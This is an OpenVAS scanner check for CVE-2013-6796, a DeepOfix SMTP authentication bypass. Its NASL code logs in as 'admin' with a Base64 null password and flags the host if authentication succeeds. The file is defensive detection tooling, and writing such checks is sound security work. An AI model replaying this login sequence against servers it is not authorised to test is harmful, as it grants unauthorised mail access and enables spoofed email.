###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_deepOfix_auth_bypass_11_13.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# DeepOfix SMTP Authentication Bypass
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103833");
  script_cve_id("CVE-2013-6796");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_version("$Revision: 11865 $");

  script_name("DeepOfix SMTP Authentication Bypass");


  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124054/DeepOfix-3.3-SMTP-Authentication-Bypass.html");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-11-19 15:05:15 +0100 (Tue, 19 Nov 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("SMTP problems");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);

  script_tag(name:"impact", value:"An Attacker could login in the SMTP server knowing only the username of one user in the
server and he could sends emails. One important thing is that the user 'admin' always
exists in the server.");
  script_tag(name:"vuldetect", value:"Try to bypass authentication for the user 'admin'");
  script_tag(name:"insight", value:"The vulnerability allows an attacker to bypass the authentication in the SMTP server
to send emails. The problem is that the SMTP server performs authentication against
LDAP by default, and the service does not check that the password is null if this
Base64. This creates a connection 'anonymous' but with a user account without entering
the password.");
  script_tag(name:"solution", value:"Ask the vendor for an Update or disable 'anonymous LDAP
bind' in your LDAP server.");
  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"summary", value:"DeepOfix versions 3.3 and below suffer from an SMTP server authentication
bypass vulnerability due to an LDAP issue.");
  script_tag(name:"affected", value:"DeepOfix 3.3 and below are vulnerable.");

  exit(0);
}

include("smtp_func.inc");
include("misc_func.inc");
include("network_func.inc");
include("host_details.inc");

port = get_kb_item("Services/smtp");
if(!port) port = 25;

if(get_kb_item('SMTP/'+port+'/broken'))exit(0);
if(!get_port_state(port))exit(0);

domain = get_kb_item("Settings/third_party_domain");
if(!domain)domain = 'example.org';

soc = smtp_open(port: port, helo: NULL);
if(!soc)exit(0);

src_name = this_host_name();

send(socket: soc, data: strcat('EHLO ', src_name, '\r\n'));
buf = smtp_recv_line(socket: soc);

if("250" >!< buf) {
  smtp_close(socket: soc);
  exit(0);
}

send(socket: soc, data:'auth login\r\n');
buf = smtp_recv_line(socket: soc);

if("334 VXNlcm5hbWU6" >!< buf) { # username:
  smtp_close(socket: soc);
  exit(0);
}

send(socket: soc, data:'YWRtaW4=\r\n'); # admin
buf = smtp_recv_line(socket: soc);

if("334 UGFzc3dvcmQ6" >!< buf) { # password:
  smtp_close(socket: soc);
  exit(0);
}

send(socket: soc, data:'AA==\r\n'); # \0
buf = smtp_recv_line(socket: soc);
smtp_close(socket: soc);

if("235 nice to meet you" >< buf) {
  security_message(port:port);
  exit(0);
}

exit(0);

